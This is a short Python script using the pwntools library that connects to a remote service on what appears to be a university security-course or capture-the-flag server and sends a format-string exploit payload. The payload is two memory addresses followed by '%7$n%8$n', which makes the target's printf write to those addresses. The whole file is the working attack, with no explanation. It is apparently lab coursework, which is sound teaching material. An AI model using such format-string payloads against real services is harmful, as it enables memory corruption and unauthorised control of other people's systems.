from pwn import *
import time

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22196

s = remote(SERVER, PORT, timeout=9999)

print(s.recv(512))
s.sendline(b'\x70\xa0\x04\x08\x78\xa0\x04\x08.%7$n%8$n')
time.sleep(1)
print(s.recv(512))